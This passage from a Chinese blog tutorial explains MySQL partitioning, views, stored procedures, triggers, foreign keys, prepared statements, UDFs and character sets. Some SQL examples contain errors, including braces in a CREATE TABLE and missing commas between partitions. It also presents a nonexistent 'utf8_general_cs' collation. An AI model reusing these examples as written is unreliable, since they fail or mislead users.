中，你可以顺序扫描，可以建索引，还可以将数据都缓存在内存中。因为分区无须额外的数据结构记录每个分区有哪些数据，所以其代价非常低。只需要一个简单的表达式就可以表达每个分区存放的是什么数据。</p><p>对表分区，可以在创建表时，使用如下语句：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE sales {</span><br><span class="line">    order_date DATETIME NOT NULL</span><br><span class="line">    -- other columns</span><br><span class="line">} ENGINE=InnoDB PARTITION BY RANGE(YEAR(order_date)) (</span><br><span class="line">    PARTITION p_2014 VALUES LESS THAN (2014),</span><br><span class="line">    PARTITION p_2015 VALUES LESS THAN (2015)</span><br><span class="line">    PARTITION p_2016 VALUES LESS THAN (2016)</span><br><span class="line">    PARTITION p_2017 VALUES LESS THAN (2017)</span><br><span class="line">    PARTITION p_catchall VALUES LESS THAN MAXVALUE</span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure><p></p><p>分区子句中可以使用各种函数，但表达式的返回值必须是一个确定的整数，且不能是一个常数。MySQL 还支持一些其他分区，比如键值、哈希、列表分区，但在生产环境中很少见到。在 MySQL5.5 以后可以使用 RANGE COLUMNS 类型分区，这样即使是基于时间分区，也无需再将其转化成一个整数。</p><p>接下来简单看下分区表上的各种操作逻辑：</p><ul><li><code>SELECT</code>：当查询一个分区表时，分区层<strong>先打开并锁住所有的底层表</strong>，优化器先判断是否可以过滤部分分区，然后在调用对应的存储引擎接口访问各个分区的数据</li><li><code>INSERT</code>：当插入一条记录时，分区层<strong>先打开并锁住所有的底层表</strong>，然后确定哪个分区接收这条记录，再将记录写入对应的底层表，DELETE操作与其类似</li><li><code>UPDATE</code>：当更新一条数据时，分区层<strong>先打开并锁住所有的底层表</strong>，然后确定数据对应的分区，然后取出数据并更新，再判断更新后的数据应该存放到哪个分区，最后对底层表进行写入操作，并对原数据所在的底层表进行删除操作</li></ul><p>有些操作是支持条件过滤的。例如，当删除一条记录时，MySQL 需要先找到这条记录，如果WHERE条件恰好和分区表达式匹配，就可以将所有不包含这条记录的分区都过滤掉，这对UPDATE语句同样有效。如果是INSERT操作，本身就只命中一个分区，其他分区都会被过滤。</p><p>虽然每个操作都会 “先打开并锁住所有的底层表”，但这并不是说分区表在处理过程中是锁住全表的。如果存储引擎能够自己实现行级锁，例如 InnoDB，则会在分区层释放对应表锁。这个加锁和解锁的操作过程与普通 InnoDB 上的查询类似。</p><p>在使用分区表时，为了保证大数据量的可扩展性，一般有两个策略：</p><ul><li>全量扫描数据，不用索引。即只要能够根据 WHERE 条件将需要查询的数据限制在少数分区中，效率是不错的</li><li>索引数据，分离热点。如果数据有明显的 “热点”，而且除了这部分数据，其他数据很少被访问到，那么可以将这部分热点数据单独存放在一个分区中，让这个分区的数据能够有机会都缓存在内存中。这样查询就可以只访问一个很小的分区表，能够使用索引，也能够有效的利用缓存。</li></ul><p>分区表的优点是优化器可以根据分区函数来过滤一些分区，但很重要的一点是要在WHERE条件中带入分区列，有时候即使看似多余的也要带上，这样就可以让优化器能够过滤掉无须访问的分区，如果没有这些条件，MySQL 就需要让对应的存储引擎访问这个表的所有分区，如果表非常大的话，就可能会非常慢。</p><p>上面两个分区策略基于两个非常重要的前提：查询都能够过滤掉很多额外的分区，分区本身并不会带来很多额外的代价。而这两个前提在某些场景下是有问题的，比如：</p><p><strong>1、NULL 值会使分区过滤无效</strong></p><p>假设按照<code>PARTITION BY RANGE YEAR(order_date)</code>分区，那么所有<code>order_date</code>为 <code>NULL</code> 或者非法值时，记录都会被存放到第一个分区。所以<code>WHERE order_date BETWEEN '2017-05-01' AND '2017-05-31'</code>，这个查询会检查两个分区，而不是我们认为的 2017 年这个分区（会额外的检查第一个分区），是因为YEAR()在接收非法值时会返回 <code>NULL</code>。如果第一个分区的数据量非常大，而且使用全表扫描的策略时，代价会非常大。为了解决这个问题，我们可以创建一个无用的分区，比如：<code>PARTITION p_null values less than (0)</code>。如果插入的数据都是有效的话，第一个分区就是空的。</p><blockquote><p>在 MySQL5.5 以后就不需要这个技巧了，因为可以直接使用列本身而不是基于列的函数进行分区：PARTITION BY RANGE COLUMNS(order_date)。直接使用这个语法可避免这个问题。</p></blockquote><p><strong>2、分区列和索引列不匹配</strong></p><p>当分区列和索引列不匹配时，可能会导致查询无法进行分区过滤，除非每个查询条件中都包含分区列。假设在列 a 上定义了索引，而在列 b 上进行分区。因为每个分区都有其独立的索引，所以在扫描列 b 上的索引就需要扫描每一个分区内对应的索引，当然这种速度不会太慢，但是能够跳过不匹配的分区肯定会更好。这个问题看起来很容易避免，但需要注意一种情况就是，关联查询。如果分区表是关联顺序的第 2 张表，并且关联使用的索引与分区条件并不匹配，那么关联时对第一张表中符合条件的每一行都需要访问并搜索第二张表的所有分区（关联查询原理，请参考前一篇文章）</p><p><strong>3、选择分区的成本可能很高</strong></p><p>分区有很多种类型，不同类型的分区实现方式也不同，所以它们的性能也不尽相同，尤其是范围分区，在确认这一行属于哪个分区时会扫描所有的分区定义，这样的线性扫描效率并不高，所以随着分区数的增长，成本会越来越高。特别是在批量插入数据时，由于每条记录在插入前，都需要确认其属于哪一个分区，如果分区数太大，会造成插入性能的急剧下降。因此有必要限制分区数量，但也不用太过担心，对于大多数系统，100 个左右的分区是没有问题的。</p><p><strong>4、打开并锁住所有底层表的成本在某些时候会很高</strong></p><p>前面说过，打开并锁住所有底层表并不会对性能有太大的影响，但在某些情况下，比如只需要查询主键，那么锁住的成本相对于主键的查询来说，成本就略高。</p><p><strong>5、维护分区的成本可能会很高</strong></p><p>新增和删除分区的速度都很快，但是修改分区会造成数据的复制，这与ALTER TABLE的原理类似，需要先创建一个历史分区，然后将数据复制到其中，最后删除原分区。因此，设计数据库时，考虑业务的增长需要，合理的创建分区表是一个非常好的习惯。在 MySQL5.6 以后的版本可以使用ALTER TABLE EXCHAGE PARTITION语句来修改分区，其性能会有很大提升。</p><p>分区表还有一些其他限制，比如所有的底层表必须使用相同的存储引擎，某些存储引擎也不支持分区。分区一般应用于一台服务器上，但一台服务器的物理资源总是有限的，当数据达到这个极限时，即使分区，性能也可能会很低，所以这个时候分库是必须的。但不管是分区、分库还是分表，它们的思想都是一样的，大家可以好好体会下。</p><h4 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h4><p>对于一些关联表的复杂查询，使用视图有时候会大大简化问题，因此在许多场合下都可以看到视图的身影，但视图真如我们所想那样简单吗？它和直接使用JOIN的 SQL 语句有何区别？视图背后的原理又了解多少？</p><p>视图本身是一个虚拟表，不存放任何数据，查询视图的数据集由其他表生成。MySQL 底层通过两种算法来实现视图：临时表算法（TEMPTABLE）和合并算法（MERGE）。所谓临时表算法就是将 SELECT 语句的结果存放到临时表中，当需要访问视图的时候，直接访问这个临时表即可。而合并算法则是重写包含视图的查询，将视图定义的 SQL 直接包含进查询 SQL 中。通过两个简单的示例来体会两个算法的差异，创建如下视图：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 视图的作用是查询未支付订单</span><br><span class="line">CREATE VIEW unpay_order AS</span><br><span class="line">SELECT * FROM sales WHERE status = <span class="string">'new'</span></span><br><span class="line">WITH CHECK OPTION;   -- 其作用下文会讲</span><br></pre></td></tr></tbody></table></figure><p></p><p>现要从未支付订单中查询购买者为csc的订单，可以使用如下查询：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 查询购买者为csc且未支付的订单</span><br><span class="line">SELECT order_id,order_amount,buyer FROM unpay_order WHERE buyer = <span class="string">'csc'</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>使用临时表来模拟视图：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE TEMPORARY TABLE tmp_order_unpay AS SELECT * FROM sales WHERE status = <span class="string">'new'</span>;</span><br><span class="line">SELECT order_id,order_amount,buyer FROM tmp_order_unpay WHERE buyer = <span class="string">'csc'</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>使用合并算法将视图定义的 SQL 合并进查询 SQL 后的样子：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT order_id,order_amount,buyer FROM sales WHERE status = <span class="string">'new'</span> AND buyer = <span class="string">'csc'</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>MySQL 可以嵌套定义视图，即在一个视图上在定义另一个视图，可以在EXPLAIN EXTENDED之后使用SHOW WARNINGS来查看使用视图的查询重写后的结果。如果采用临时表算法实现的视图，EXPLAIN中会显示为派生表（DERIVED），注意EXPLAIN时需要实际执行并产生临时表，所以有可能会很慢。</p><p>明显地，临时表上没有任何索引，而且优化器也很难优化临时表上的查询，因此，如有可能，尽量使用合并算法会有更好的性能。那么问题来了：合并算法（类似于直接查询）有更好的性能，为什么还要使用视图？</p><p>首先视图可以简化应用上层的操作，让应用更专注于其所关心的数据。其次，视图能够对敏感数据提供安全保护，比如：对不同的用户定义不同的视图，可以使敏感数据不出现在不应该看到这些数据的用户视图上；也可以使用视图实现基于列的权限控制，而不需要真正的在数据库中创建列权限。再者，视图可以方便系统运维，比如：在重构 schema 的时候使用视图，使得在修改视图底层表结构的时候，应用代码还可以继续运行不报错。</p><p>基于此，使用视图其实更多的是基于业务或者维护成本上的考虑，其本身并不会对性能提升有多大作用（注意：此处只是基于 MySQL 考虑，其他关系性数据库中视图可能会有更好的性能，比如ORACLE和MS SQL SERVER都支持物化视图，它们都比 MySQL 视图有更好的性能）。而且使用临时表算法实现的视图，在某些时候性能可能会非常糟糕，比如：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- 视图的作用是统计每日支出金额，DATE(<span class="string">'2017-06-15 12:00:23'</span>) = 2017-06-15</span><br><span class="line">CREATE VIEW cost_per_day AS</span><br><span class="line">SELECT DATE(create_time) AS date,SUM(cost) AS cost FROM costs GROUP BY date;</span><br></pre></td></tr></tbody></table></figure><p></p><p>现要统计每日的收入与支出，有类似于上面的收入表，可以使用如下 SQL：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT c.date,c.cost,s.amount</span><br><span class="line">FROM cost_per_day AS c</span><br><span class="line">JOIN sale_per_day AS s USING(date)</span><br><span class="line">WHERE date BETWEEN <span class="string">'2017-06-01'</span> AND <span class="string">'2017-06-30'</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这个查询中，MySQL 先执行视图的 SQL，生成临时表，然后再将sale_per_day表和临时表进行关联。这里WHERE字句中的BETWEEN条件并不能下推到视图中，因而视图在创建时，会将所有的数据放到临时表中，而不是一个月数据，并且这个临时表也不会有索引。</p><p>当然这个示例中的临时表数据不会太大，毕竟日期的数量不会太多，但仍然要考虑生成临时表的性能（如果 costs 表数据过大，GROUP BY有可能会比较慢）。而且本示例中索引也不是问题，通过上一篇我们知道，如果 MySQL 将临时表作为关联顺序中的第一张表，仍然可以使用sale_per_day中的索引。但如果是对两个视图做关联的话，优化器就没有任何索引可以使用，这时就需要严格测试应用的性能是否满足需求。</p><p>我们很少会在实际业务场景中去更新视图，因此印象中，视图是不能更新的。但实际上，在某些情况下，视图是可以更新的。可更新视图是指通过更新这个视图来更新视图涉及的相关表，只要指定了合适的条件，就可以更新、删除甚至是向视图中插入数据。通过上文的了解，不难推断出：更新视图的实质就是更新视图关联的表，将创建视图的WHERE子句转化为UPDATE语句的WHERE子句，只有使用合并算法的视图才能更新，并且更新的列必须来自同一个表中。回顾上文创建视图的 SQL 语句，其中有一句：WITH CHECK OPTION，其作用就是表示通过视图更新的行，都必须符合视图本身的WHERE条件定义，不能更新视图定义列以外的列，否则就会抛出check option failed错误。</p><p>视图还有一个容易造成误解的地方：“对于一些简单的查询，视图会使用合并算法，而对于一些比较复杂的查询，视图就会使用临时表算法”。但实际上，视图的实现算法是视图本身的属性决定的，跟作用在视图上的 SQL 没有任何关系。那什么时候视图采用临时表算法，什么时候采用合并算法呢？一般来说，只要原表记录和视图中的记录无法建立一一映射的关系时，MySQL 都将使用临时表算法来实现视图。比如创建视图的 SQL 中包含GROUP BY、DISTINCT、UNION、聚合函数、子查询的时候，视图都将采用临时表算法（这些规则在以后的版本中，可能会发生改变，具体请参考官方手册）。</p><p>相比于其它关系型数据库的视图，MySQL 的视图在功能上会弱很多，比如ORACLE和MS SQL SERVER都支持物化视图。物化视图是指将视图结果数据存放在一个可以查询的表中，并定期从原始表中刷新数据到这张表中，这张表和普通物理表一样，可以创建索引、主键约束等等，性能相比于临时表会有质的提升。但遗憾的是 MySQL 目前并不支持物化视图，当然 MySQL 也不支持在视图中创建索引。</p><h4 id="存储过程与触发器"><a href="#存储过程与触发器" class="headerlink" title="存储过程与触发器"></a>存储过程与触发器</h4><p>回到第二个问题，有非常多的人在分享时都会抛出这样一个观点：尽可能不要使用存储过程，存储过程非常不容易维护，也会增加使用成本，应该把业务逻辑放到客户端。既然客户端都能干这些事，那为什么还要存储过程？</p><p>如果有深入了解过存储过程，就会发现存储过程并没有大家描述的那么不堪。我曾经经历过一些重度使用存储过程的产品，依赖到什么程度呢？就这么说吧，上层的应用基本上只处理交互与动效的逻辑，所有的业务逻辑，甚至是参数的校验均在存储过程中实现。曾经有出现过一个超大的存储过程，其文件大小达到惊人的 80K，可想而知，其业务逻辑有多么复杂。在大多数人眼中，这样的技术架构简直有点不可理喻，但实际上这款产品非常成功。</p><p>其成功的原因在一定程度上得益于存储过程的优点，由于业务层代码没有任何侵入业务的代码，在不改变前端展示效果的同时，可以非常快速的修复 BUG、开发新功能。由于这款产品需要部署在客户的私有环境上，快速响应客户的需求就变得尤为重要，正是得益于这种架构，可以在客户出现问题或者提出新需求时，快速响应，极端情况下，我们可以在 1 小时内修复客户遇到的问题。正是这种快速响应机制，让我们获得大量的客户。</p><p>当然存储过程还有其他的优点，比如，可以非常方便的加密存储过程代码，而不用担心应用部署到私有环境造成源代码泄露、可以像调试其他应用程序一样调试存储过程、可以设定存储过程的使用权限来保证数据安全等等。一切都非常美好，但我们的产品是基于MS SQL SERVER实现的，其可以通过T-SQL非常方便的实现复杂的业务逻辑。你可以把T-SQL看做是一门编程语言，其包含SQL的所有功能，还具备流程控制、批处理、定时任务等能力，你甚至可以用其来解析 XML 数据。关于T-SQL的更多信息可以参考MSDN，主流的关系型数据库目前只有MS SQL SERVER支持T-SQL，因此，MySQL 并不具备上文描述的一些能力，比如，MySQL 的存储过程调试非常不方便（当然可以通过付费软件来获得很好的支持）。</p><p>除此之外，MySQL 存储过程还有一些其他的限制：</p><ul><li>优化器无法评估存储过程的执行成本</li><li>每个连接都有独立的存储过程执行计划缓存，如果有多个连接需要调用同一个存储过程，将会浪费缓存空间来缓存相同的执行计划</li></ul><p>因此，在 MySQL 中使用存储过程并不是一个太好策略，特别是在一些大数据、高并发的场景下，将复杂的逻辑交给上层应用实现，可以非常方便的扩展已有资源以便获得更高的计算能力。而且对于熟悉的编程语言，其可读性会比存储过程更好一些，也更加灵活。不过，在某些场景下，如果存储过程比其他实现会快很多，并且是一些较小的操作，可以适当考虑使用存储过程。</p><p>和存储过程类似的，还有触发器，触发器可以让你在执行INSERT、UPDATE和DELETE时，执行一些特定的操作。在 MySQL 中可以选择在 SQL 执行之前触发还是在 SQL 执行后触发。触发器一般用于实现一些强制的限制，这些限制如果在应用程序中实现会让业务代码变得非常复杂，而且它也可以减少客户端与服务器之间的通信。MySQL 触发器的实现非常简单，所以功能非常有限，如果你在其他数据库产品中已经重度依赖触发器，那么在使用 MySQL 触发器时候需要注意，因为 MySQL 触发器的表现和预想的不一致。</p><p>首先对一张表的每一个事件，最多只能定义一个触发器，而且它只支持 “基于行的触发”，也就是触发器始终是针对一条记录的，而不是针对整个 SQL 语句。如果是批量更新的话，效率可能会很低。其次，触发器可以掩盖服务器本质工作，一个简单的 SQL 语句背后，因为触发器，可能包含了很多看不见的工作。再者，触发器出现问题时很难排查。最后，触发器并不一定能保证原子性，比如MyISAM引擎下触发器执行失败了，也不能回滚。在InnoDB表上的触发器是在同一个事务中执行完成的，所以他们的执行是原子的，原操作和触发器操作会同时失败或者成功。</p><p>虽然触发器有这么多限制，但它仍有适用的场景，比如，当你需要记录 MySQL 数据的变更日志，这时触发器就非常方便了。</p><h4 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h4><p>目前在大多数互联网项目，特别是在大数据的场景下，已经不建议使用外键了，主要是考虑到外键的使用成本：</p><ul><li>外键通常要求每次修改数据时都要在另外一张表中执行一次查找操作。在 InnoDB 存储引擎中会强制外键使用索引，但在大数据的情况下，仍然不能忽略外键检查带来的开销，特别是当外键的选择性很低时，会导致一个非常大且选择性低的索引。</li><li>如果向子表中插入一条记录，外键约束会让 InnoDB 检查对应的父表的记录，也就需要对父表对应记录进行加锁操作，来确保这条记录不会在这个事务完成之时就被删除了。这会导致额外的锁等待，甚至会导致一些死锁。</li><li>高并发场景下，数据库很容易成为性能瓶颈，自然而然的就希望数据库可以水平扩展，这时就需要把数据的一致性控制放到应用层，也就是让应用服务器可以承担压力，这种情况下，数据库层面就不能使用外键。</li></ul><p>因此，当不用过多考虑数据库的性能问题时，比如一些内部项目或传统行业项目（其使用人数有限，而且数据量一般不会太大），使用外键是一个不错的选择，毕竟想要确保相关表始终有一致的数据，使用外键要比在应用程序中检查一致性方便简单许多，此外，外键在相关数据的删除和更新操作上也会比在应用中要高效。</p><h4 id="绑定变量"><a href="#绑定变量" class="headerlink" title="绑定变量"></a>绑定变量</h4><p>可能大家看到 “绑定变量” 这个词时，会有一点陌生，换个说法可能会熟悉一些：prepared statement。绑定变量的 SQL，使用问号标记可以接收参数的位置，当真正需要执行具体查询的时候，则使用具体的数值代替这些问号，比如：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT order_no, order_amount FROM sales WHERE order_status = ? and buyer = ?</span><br><span class="line">```    </span><br><span class="line"></span><br><span class="line">为什么要使用绑定变量？总所周知的原因是可以预先编译，减少 SQL 注入的风险，除了这些呢？</span><br><span class="line"></span><br><span class="line">当创建一个绑定变量 SQL 时，客户端向服务器发送了一个 SQL 语句原型，服务器收到这个 SQL 语句的框架后，解析并存储这个 SQL 语句的部分执行计划，返回给客户端一个 SQL 语句处理句柄，从此以后，客户端通过向服务器发送各个问号的取值和这个句柄来执行一个具体查询，这样就可以更高效地执行大量重复语句，因为：</span><br><span class="line">* 服务器只需要解析一次 SQL 语句</span><br><span class="line">* 服务器某些优化器的优化工作也只需要做一次，因为 MySQL 会缓存部分执行计划</span><br><span class="line">* 通信中仅仅发送的是参数，而不是整个语句，网络开销也会更小，而且以二进制发送参数和句柄要比发送 ASCII 文本的效率更高</span><br><span class="line"></span><br><span class="line">需要注意的是，MySQL 并不是总能缓存执行计划，如果某些执行计划需要根据参入的参数来计算时，MySQL 就无法缓存这部分执行计划。比如：</span><br><span class="line">```bash</span><br><span class="line">-- 这里假装有一个例子，大家可以自己思考一下</span><br></pre></td></tr></tbody></table></figure><p></p><p>使用绑定变量的最大陷阱是：你知道其原理，但不知道它是如何实现的。有时候，很难解释如下 3 种绑定变量类型之间的区别：</p><ol><li>客户端模拟的绑定变量：客户端的驱动程序接收一个带参数的 SQL，再将参数的值带入其中，最后将完整的查询发送到服务器。</li><li>服务器绑定变量：客户端使用特殊的二进制协议将带参数的 SQL 语句发送到服务器端，然后使用二进制协议将具体的参数值发送给服务器并执行。</li><li>SQL 接口的绑定变量：客户端先发送一个带参数的 SQL 语句到服务器端，这类似于使用prepared的 SQL 语句，然后发送设置的参数，最后在发送execute指令来执行 SQL，所有这些都是用普通的文本传输协议。</li></ol><p>比如某些不支持预编译的 JDBC 驱动，在调用<code>connection.prepareStatement(sql)</code>时，并不会把 <code>SQL</code> 语句发送给数据库做预处理，而是等到调用<code>executeQuery</code>方法时才把整个语句发送到服务器，这种方式就类似于第 1 种情况。因此，在程序中使用绑定变量时，理解你使用的驱动通过哪种方式来实现就显得很有必要。延伸开来说，对于自己使用的框架、开源工具，不应仅仅停留在会使用这个层面，有时间可以深入了解其原理和实现，不然有可能被骗了都不知道哦。</p><h4 id="用户自定义函数"><a href="#用户自定义函数" class="headerlink" title="用户自定义函数"></a>用户自定义函数</h4><p>MySQL 本身内置了非常多的函数，比如SUM、COUNT、AVG等等，可实际应用中，我们常常需要更多。大多数情况下，更强大的功能都是在应用层面实现，但实际上 MySQL 也提供了机会让我们可以去扩展 MySQL 函数，这就是用户自定义函数 (user-defined function)，也称为：UDF。需要注意UDF与存储过程和通过 SQL 创建函数的区别，存储过程只能使用 SQL 来编写，而UDF没有这个限制，可以使用支持 C 语言调用约定的任何编程语言来实现。</p><p>UDF必须事先编译好并动态链接到服务器上，这种平台相关性使得UDF在很多方面都很强大，UDF速度非常快，而且可以访问大量操作系统功能，还可以使用大量库函数。如果需要一个 MySQL 不支持的统计聚合函数，并且无法使用存储过程来实现，而且还想不同的语言都可以调用，那么UDF是不错的选择，至少不需要每种语言都来实现相同的逻辑。</p><p>所谓能力越大，责任也就越大，UDF中的一个错误可能直接让服务器崩溃，甚至扰乱服务器的内存和数据，因此，使用时需要注意其潜在的风险。在 MySQL 版本升级时也需要注意，因为你可能需要重新编译或者修改这些UDF，以便让它们能在新版本中工作。</p><p>这里有一个简单的示例来展示如何创建UDF：将结果集转化为 JSON，具体的代码请参考：lib_mysqludf_json。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-- 1、首先使用c语言实现功能</span><br><span class="line">-- 2、编译</span><br><span class="line">-- 这里省略第1、2步，实现并编译成.so</span><br><span class="line">-- 3、使用SQL创建函数</span><br><span class="line">DROP FUNCTION json_array;</span><br><span class="line">CREATE FUNCTION json_array RETURNS string soname <span class="string">'lib_mysqludf_json.so'</span>;</span><br><span class="line">-- 4、使用函数</span><br><span class="line">SELECT</span><br><span class="line">  json_array(</span><br><span class="line">    customer_id,</span><br><span class="line">    first_name,</span><br><span class="line">    last_name,</span><br><span class="line">    last_update</span><br><span class="line">  ) as customer</span><br><span class="line">FROM</span><br><span class="line">  customer</span><br><span class="line">WHERE</span><br><span class="line">  customer_id = 1;</span><br><span class="line">/*</span><br><span class="line">5、得到的结果如下：</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| customer                                 |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| [1,<span class="string">"MARY"</span>,<span class="string">"SMITH"</span>,<span class="string">"2006-02-15 04:57:20"</span>] |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">*/</span><br></pre></td></tr></tbody></table></figure><p></p><p>其大致的实现流程：使用 C 语言实现逻辑 -> 编译成.so文件 -> 创建函数 -> 使用函数。UDF在实际工作中可能很少使用，但作为开发者的我们，了解这么一款强大的工具，在解决棘手问题时，也让我们有了更多的选择。</p><h4 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h4><p>最后说说字符集。</p><p>关于字符集大多数人的第一印象可能就是：数据库字符集尽量使用<code>UTF8</code>，因为<code>UTF8</code>字符集是目前最适合于实现多种不同字符集之间的转换的字符集，可以最大程度上避免乱码问题，也可以方便以后的数据迁移。But why？</p><p>字符集是指一种从<strong>二进制编码到某类字符符号</strong>的映射，可以参考如何使用一个字节来表示英文字母。校对规则是指一组<strong>用于某个字符集的排序规则</strong>，即采用何种规则对某类字符进行排序。MySQL 每一类编码字符都有其对应的字符集和校对规则。MySQL 对各种字符集的支持都非常完善，但同时也带来一些复杂性，某些场景下甚至会有一些性能牺牲。</p><p>一种字符集可能对应多种校对规则，且都有一个默认校对规则，那在 MySQL 中是如何使用字符集的？在 MySQL 中可以通过两种方式设置字符集：创建对象时设置默认值、客户端与服务器通信时显式设置。</p><p>MySQL 采用 “阶梯” 式的方式来设定字符集默认值，每个数据库，每张表都有自己的默认值，它们逐层继承，最终最靠底层的默认设置将影响你创建的对象。比如，创建数据库时，将根据服务器上的character_set_server来设置数据库的默认字符集，同样的道理，根据database的字符集来指定库中所有表的字符集…… 不管是对数据库，还是表和列，只有当它们没有显式指定字符集时，默认字符集才会起作用。</p><p>当客户端与服务器通信时，它们可以使用不同的字符集，这时候服务器将进行必要的转换工作。当客户端向服务器发送请求时，数据以character_set_client设置的字符集进行编码；而当服务器收到客户端的 SQL 或者数据时，会按照character_set_connection设置的字符集进行转换；当服务器将要进行增删改查等操作前会再次将数据转换成character_set_database(数据库采用的字符集，没有单独配置即使用默认配置，具体参考上文)，最后当服务器返回数据或者错误信息时，则将数据按character_set_result设置的字符集进行编码。服务器端可以使用SET CHARACTER SET来改变上面的配置，客户端也可以根据对应的 API 来改变字符集配置。客户端和服务器端都使用正确的字符集才能避免在通信中出现问题。</p><h4 id="那如何选择字符集"><a href="#那如何选择字符集" class="headerlink" title="那如何选择字符集"></a>那如何选择字符集</h4><p>在考虑使用何种字符集时，最主要的衡量因素是存储的内容，在能够满足存储内容的前提下，尽量使用较小的字符集。因为更小的字符集意味着更少空间占用、以及更高的网络传输效率，也间接提高了系统的性能。如果存储的内容是英文字符等拉丁语系字符的话，那么使用默认的latin1字符集完全没有问题（MySQL 8 默认utf8mb4），如果需要存储汉字、俄文、阿拉伯语等非拉丁语系字符，则建议使用UTF8字符集。当然不同字符在使用UTF8字符集所占用的空间是不同的，比如英文字符在UTF8字符集中只使用一个字节，而一个汉字则占用 3 个字节。</p><p>除了字符集，校对规则也是我们需要考虑的问题。对于校对规则，一般来说只需要考虑是否以大小写敏感的方式比较字符串或者是否用字符串编码的二进制来比较大小，其对应的校对规则的后缀分别是_cs、_ci和_bin。大小写敏感和二进制校对规则的不同之处在于，二进制校对规则直接使用字符的字节进行比较，而大小写敏感的校对规则在多字节字符集时，如德语，有更复杂的比较规则。举个简单的例子，UTF8字符集对应校对规则有三种：</p><ul><li>utf8_bin将字符串中的每一个字符用二进制数据存储，区分大小写</li><li>utf8_general_ci不区分大小写，ci为case insensitive的缩写，即大小写不敏感</li><li>utf8_general_cs区分大小写，cs为case sensitive的缩写，即大小写敏感</li></ul><p>比如，创建一张表，使用UTF8编码，且大小写敏感时，可以使用如下语句：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE sales (</span><br><span class="line">    order_no VARCHAR(32) NOT NULL PRIMARY KEY,</span><br><span class="line">    order_amount INT NOT NULL DEFAULT 0,</span><br><span class="line">    ......</span><br><span class="line">) ENGINE=InnoDB COLLATE=utf8_general_cs;</span><br></pre></td></tr></tbody></table></figure><p></p><p>因此，在项目中直接使用UTF8字符集是完全没有问题的，但需要记住的是不要在一个数据库中使用多个不同的字符集，不同字符集之间的不兼容问题很难缠。有时候，看起来一切正常，但是当某个特殊字符出现时，一切操作都会出错，而且你很难发现错误的原因。</p><h4 id="字符集对数据库的性能有影响吗"><a href="#字符集对数据库的性能有影响吗" class="headerlink" title="字符集对数据库的性能有影响吗"></a>字符集对数据库的性能有影响吗</h4><p>某些字符集和校对规则可能会需要多个的 CPU 操作，可能会消耗更多的内存和存储空间，这点在前文已经说过。特别是在同一个数据库中使用不同的字符集，造成的影响可能会更大。</p><p>不同字符集和校对规则之间的转换可能会带来额外的系统开销，比如，数据表sales在buyer字段上有索引，则可以加速下面的ORDER BY操作：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT order_no,order_amount FROM sales ORDER BY buyer;</span><br></pre></td></tr></tbody></table></figure><p></p><p>只有当 SQL 查询中排序要求的字符集与服务器数据的字符集相同时，才能使用索引进行排序。你可能会说，这不是废话吗？其实不然，MySQL 是可以单独指定排序时使用的校对规则的，比如：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- 你说，这不是吃饱了撑的吗？我觉得也是，也许会有其适用的场景吧</span><br><span class="line">-- 这时候就不能使用索引排序呢，只能使用文件排序</span><br><span class="line">SELECT 